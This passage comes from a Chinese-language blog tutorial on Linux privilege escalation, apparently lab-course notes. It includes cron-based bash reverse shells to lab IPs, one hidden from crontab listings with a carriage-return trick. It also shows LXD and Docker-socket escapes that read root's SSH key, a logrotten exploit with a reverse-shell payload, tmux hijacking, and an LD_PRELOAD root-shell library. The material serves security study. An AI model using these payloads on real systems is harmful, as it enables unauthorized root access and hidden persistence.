class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Usage:  crontab [-u user] [-n] file</span><br><span class="line">        crontab [ -u user ] [ -i ] &#123; -e | -l | -r &#125;</span><br><span class="line">        file从文件中导入定时任务(默认替换)</span><br><span class="line">        -u &lt;user&gt;指定要操作的用户的 crontab 文件(root)</span><br><span class="line">        -e编辑当前用户的定时任务文件</span><br><span class="line">        -l当前用户的定时任务列表</span><br><span class="line">        -r删除当前用户的定时任务文件</span><br><span class="line"></span><br><span class="line">crontab 文件格式:</span><br><span class="line">* * * * * command</span><br><span class="line">- - - - -</span><br><span class="line">| | | | |</span><br><span class="line">| | | | +---- 星期几 (0 - 7) (星期日为 0 或 7)</span><br><span class="line">| | | +------ 月份 (1 - 12)</span><br><span class="line">| | +-------- 一个月中的第几天 (1 - 31)</span><br><span class="line">| +---------- 小时 (0 - 23)</span><br><span class="line">+------------ 分钟 (0 - 59)</span><br><span class="line">example:</span><br><span class="line">* * * * * /path/to/script.sh每分钟运行一次脚本</span><br><span class="line">*/10 * * * * /path/to/script.sh每隔 10 分钟运行一次脚本</span><br><span class="line">5,35 * * * * /path/to/script.sh每小时的第 5 分钟和第 35 分钟运行脚本</span><br><span class="line">0 15 * * 1,2 /path/to/script.sh每周一和周二的下午 3 点运行脚本</span><br><span class="line"></span><br><span class="line">crontab 支持一些特殊字符串来简化时间设置:</span><br><span class="line">@reboot系统启动时运行一次</span><br><span class="line">@yearly或 @annually：每年运行一次，相当于 0 0 1 1 *</span><br><span class="line">@monthly每月运行一次，相当于 0 0 1 * *</span><br><span class="line">@weekly每周运行一次，相当于 0 0 * * 0</span><br><span class="line">@daily | @midnight每天运行一次，相当于 0 0 * * *</span><br><span class="line">@hourly每小时运行一次，相当于 0 * * * *</span><br><span class="line">example:</span><br><span class="line">@reboot /path/to/script.sh</span><br><span class="line">@daily /path/to/daily_script.sh</span><br><span class="line">@weekly /path/to/weekly_script.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务启动:</span></span><br><span class="line">service cron start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">/etc/init.d/cron &#123;start|stop|status|restart|reload|force-reload&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用crontab命令</span></span><br><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">crontab -l | &#123; cat; echo &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222 0&gt;&amp;1&quot;;&#125; | crontab -</span><br><span class="line"></span><br><span class="line">(crontab -l;printf &quot;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.10.128/2222 0&gt;&amp;1;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><p>某些应用程序会在 &#x2F;etc&#x2F;cron.d 目录中创建 cron 文件，并且可能配置错误，允许非 root 用户编辑它们。</p><p>检查一下系统中是否有可写文件或目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/etc/cron.daily/backup</span><br><span class="line">/dmz-backups/backup.sh</span><br><span class="line">/proc</span><br><span class="line">/sys/fs/cgroup/memory/init.scope/cgroup.event_control</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">/home/backupsvc/backup.sh</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/DominicBreuker/pspy">pspy</a>是一个命令行工具，用于查看正在运行的进程，无需 root 权限。可以使用它来查看其他用户运行的命令、cron 作业等。它的工作原理是扫描<a href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。<code>-pf</code>打印命令和文件系统事件，<code>-i 1000</code>扫描一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ ./pspy64 -pf -i 1000</span><br><span class="line"></span><br><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=99     | </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=10     | </span><br><span class="line">2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2203   | </span><br><span class="line">2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html </span><br><span class="line">2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip </span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br><span class="line">2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh </span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache</span><br><span class="line">2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive</span><br></pre></td></tr></table></figure><p>可以看到一个 cron 作业运行位于 &#x2F;dmz-backups 目录中的 backup.sh 脚本，并创建 &#x2F;var&#x2F;www&#x2F;html 目录内容的 tarball 文件。</p><p>附加恶意代码，尝试以 root 身份获取反向 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lnvp 443</span><br><span class="line"></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882</span><br><span class="line">bash: cannot set terminal process group (9143): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">root@NIX02:~#</span><br></pre></td></tr></table></figure><h1 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h1><h2 id="LXD"><a href="#LXD" class="headerlink" title="LXD"></a>LXD</h2><p>容器在操作系统层面运行，而虚拟机在硬件层面运行。因此，容器共享操作系统并将应用程序进程与系统其余部分隔离，而传统虚拟化允许多个操作系统在单个系统上同时运行。</p><p>Linux 容器 ( <code>LXC</code>) 是一种操作系统级虚拟化技术，允许多个 Linux 系统通过拥有自己的进程但共享主机系统内核在单个主机上彼此隔离地运行。</p><p>Linux Daemon ( <a href="https://github.com/lxc/lxd">LXD</a> ) 在某些方面与之类似，但它被设计为包含一个完整的操作系统。因此，它不是一个应用程序容器，而是一个系统容器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ id</span><br><span class="line"></span><br><span class="line">uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)</span><br></pre></td></tr></table></figure><p>将此容器作为映像导入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp</span><br><span class="line">$ lxc image list</span><br><span class="line"></span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br><span class="line">|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |</span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br><span class="line">| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |</span><br><span class="line">+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+</span><br></pre></td></tr></table></figure><p>指定标志和容器的根路径来启动镜像并对其进行配置，<code>security.privileged=true</code>禁用允许在主机上执行操作的所有隔离功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ lxc init ubuntutemp privesc -c security.privileged=true</span><br><span class="line">$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</span><br></pre></td></tr></table></figure><p>完成上述操作后，就可以启动容器并登录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ lxc start privesc</span><br><span class="line">$ lxc exec privesc /bin/bash</span><br><span class="line">root@nix02:~#</span><br></pre></td></tr></table></figure><h2 id="Docker-1"><a href="#Docker-1" class="headerlink" title="Docker"></a>Docker</h2><p>Docker 是一种流行的开源工具，它为软件应用程序提供可移植且一致的运行时环境。它使用容器作为用户空间中的隔离环境，在操作系统级别运行并共享文件系统和系统资源。</p><p>Docker 架构的核心是客户端-服务器模型，其中有两个主要组件：</p><ul><li>Docker 守护进程</li><li>Docker 客户端</li></ul><h3 id="Docker-共享目录"><a href="#Docker-共享目录" class="headerlink" title="Docker 共享目录"></a>Docker 共享目录</h3><p>共享目录，可以在容器内访问主机系统上的特定目录或文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd /hostsystem/home/cry0l1t3</span><br><span class="line">root@container:~$</span><br></pre></td></tr></table></figure><h3 id="Docker-套接字"><a href="#Docker-套接字" class="headerlink" title="Docker 套接字"></a>Docker 套接字</h3><p>Docker 套接字或 Docker 守护程序套接字是一种特殊文件，允许和进程与 Docker 守护程序进行通信。</p><p>创建 Docker 容器，将主机的根目录 ( <code>/</code>) 映射到<code>/hostsystem</code>容器上的目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app</span><br><span class="line">$ docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>通常，此套接字位于<code>/var/run/docker.sock</code>。但是，位置可以不同，这是可以理解的。因为基本上，这只能由 root 或 docker 组写入。</p><p>如果不属于这两个组之一的用户，并且 Docker 套接字仍然具有可写的权限，那么可以使用这种情况来提升权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br><span class="line"></span><br><span class="line">root@ubuntu:~#</span><br></pre></td></tr></table></figure><h1 id="Logrotate"><a href="#Logrotate" class="headerlink" title="Logrotate"></a>Logrotate</h1><p>每个 Linux 系统都会生成大量日志文件。为了防止硬盘溢出，一个名为<code>logrotate</code>的工具负责归档或处理旧日志。</p><p>Logrotate 本身的功能是重命名日志文件。例如，可以为每个新一天创建新的日志文件，并自动重命名较旧的日志文件。另一个例子是清空最旧的日志文件，从而减少内存消耗。</p><p>此工具通常通过<code>cron</code>定期启动并通过配置文件<code>/etc/logrotate.conf</code>进行控制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/logrotate.conf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># see &quot;man logrotate&quot; for details</span><br><span class="line"></span><br><span class="line"># global options do not affect preceding include directives</span><br><span class="line"></span><br><span class="line"># rotate log files weekly</span><br><span class="line">weekly</span><br><span class="line"></span><br><span class="line"># use the adm group by default, since this is the owning group</span><br><span class="line"># of /var/log/syslog.</span><br><span class="line">su root adm</span><br><span class="line"></span><br><span class="line"># keep 4 weeks worth of backlogs</span><br><span class="line">rotate 4</span><br><span class="line"></span><br><span class="line"># create new (empty) log files after rotating old ones</span><br><span class="line">create</span><br><span class="line"></span><br><span class="line"># use date as a suffix of the rotated file</span><br><span class="line">#dateext</span><br><span class="line"></span><br><span class="line"># uncomment this if you want your log files compressed</span><br><span class="line">#compress</span><br><span class="line"></span><br><span class="line"># packages drop log rotation information into this directory</span><br><span class="line">include /etc/logrotate.d</span><br><span class="line"></span><br><span class="line"># system-specific logs may also be configured here.</span><br></pre></td></tr></table></figure><p>为了利用<code>logrotate</code>，需要满足一些要求。</p><ol><li>需要日志文件的<code>write</code>权限</li><li>logrotate 必须以特权用户身份运行或<code>root</code></li><li>易受攻击的版本：<ul><li>3.8.6</li><li>3.11.0</li><li>3.15.0</li><li>3.18.0</li></ul></li></ol><p>如果满足要求，可以利用名为<a href="https://github.com/whotwagner/logrotten">logrotten</a>的漏洞。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/whotwagner/logrotten.git</span><br><span class="line">$ cd logrotten</span><br><span class="line">$ gcc logrotten.c -o logrotten</span><br><span class="line">$ echo &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1&#x27; &gt; payload</span><br></pre></td></tr></table></figure><p>在利用漏洞利用之前，需要确定<code>logrotate</code>使用了哪个选项<code>logrotate.conf</code>，必须使用适合此功能的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;create\|compress&quot; /etc/logrotate.conf | grep -v &quot;#&quot;</span><br><span class="line"></span><br><span class="line">create</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./logrotten -p ./payload /tmp/tmp.log</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nc -nlvp 9001</span><br><span class="line"></span><br><span class="line">Listening on 0.0.0.0 9001</span><br><span class="line">Connection received on 10.129.24.11 49818</span><br><span class="line"># id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Miscellaneous-Techniques"><a href="#Miscellaneous-Techniques" class="headerlink" title="Miscellaneous Techniques"></a>Miscellaneous Techniques</h1><h2 id="被动流量捕获"><a href="#被动流量捕获" class="headerlink" title="被动流量捕获"></a>被动流量捕获</h2><p>捕获网络上传递的数据，例如<a href="https://github.com/DanMcInerney/net-creds">net-creds</a>和<a href="https://github.com/lgandx/PCredz">PCredz</a>。</p><h2 id="弱-NFS-权限"><a href="#弱-NFS-权限" class="headerlink" title="弱 NFS 权限"></a>弱 NFS 权限</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e 10.129.2.12</span><br><span class="line"></span><br><span class="line">Export list for 10.129.2.12:</span><br><span class="line">/tmp             *</span><br><span class="line">/var/nfs/general *</span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td><code>root_squash</code></td><td>如果使用 root 用户访问 NFS 共享，则会将其更改为<code>nfsnobody</code>用户，这是一个非特权帐户。由 root 用户创建和上传的任何文件都将归该用户所有<code>nfsnobody</code>，这可以防止攻击者上传设置了 SUID 位的二进制文件。</td></tr><tr><td><code>no_root_squash</code></td><td>以本地 root 用户身份连接到共享的远程用户将能够以 root 用户身份在 NFS 服务器上创建文件。这将允许创建设置了 SUID 位的恶意脚本&#x2F;程序。</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/exports</span><br><span class="line"></span><br><span class="line"># /etc/exports: the access control list for filesystems which may be exported</span><br><span class="line">#to NFS clients.  See exports(5).</span><br><span class="line">#</span><br><span class="line"># Example for NFSv2 and NFSv3:</span><br><span class="line"># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line"># Example for NFSv4:</span><br><span class="line"># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="line"># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line">/var/nfs/general *(rw,no_root_squash)</span><br><span class="line">/tmp *(rw,no_root_squash)</span><br></pre></td></tr></table></figure><p>可以创建一个使用本地 root 用户执行<code>/bin/sh</code>的 SETUID 二进制文件。然后，在本地挂载目录，将 root 拥有的二进制文件复制到 NFS 服务器，并设置 SUID 位。</p><h2 id="Hijacking-Tmux-Session"><a href="#Hijacking-Tmux-Session" class="headerlink" title="Hijacking Tmux Session"></a>Hijacking Tmux Session</h2><p>用户可能会让<code>tmux</code>进程以特权用户身份运行，例如设置了弱权限的 root，并且可能被劫持。</p><p>创建新的共享会话并修改所有权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tmux -S /shareds new -s debugsess</span><br><span class="line">$ chown root:devs /shareds</span><br></pre></td></tr></table></figure><p>如果可以攻陷<code>dev</code>组中的一个用户，就可以附加到该会话并获得 root 访问权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tmux -S /shareds</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h1 id="Kernel-Exploits"><a href="#Kernel-Exploits" class="headerlink" title="Kernel Exploits"></a>Kernel Exploits</h1><p>各种 Linux 内核版本都存在内核级漏洞。这些漏洞利用内核中的漏洞以 root 权限执行代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ uname -a</span><br><span class="line"></span><br><span class="line">Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">$ cat /etc/lsb-release </span><br><span class="line"></span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=16.04</span><br><span class="line">DISTRIB_CODENAME=xenial</span><br><span class="line">DISTRIB_DESCRIPTION=&quot;Ubuntu 16.04.4 LTS&quot;</span><br></pre></td></tr></table></figure><h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux 程序通常使用动态链接共享对象库。库包含已编译的代码或其他数据，开发人员可以使用它们来避免在多个程序中重写相同的代码。Linux 中存在两种类型的库：<code>static libraries</code>（用 .a 文件扩展名表示）和<code>dynamically linked shared object libraries</code>（用 .so 文件扩展名表示）。编译程序时，静态库将成为程序的一部分，无法更改。但是，可以修改动态库以控制调用它们的程序的执行。</p><p><code>LD_PRELOAD</code>环境变量可以在执行二进制文件之前加载库。此库中的函数优先于默认函数。</p><p>使用<code>ldd</code>实用程序查看二进制文件所需的共享对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ldd /bin/ls</span><br><span class="line"></span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)</span><br><span class="line">libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)</span><br><span class="line">libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)</span><br><span class="line">libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</span><br></pre></td></tr></table></figure><p>exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for daniel.carter on NIX02:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User daniel.carter may run the following commands on NIX02:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/apache2 restart</span><br></pre></td></tr></table></figure><p>利用此<code>LD_PRELOAD</code>问题来运行自定义共享库文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC 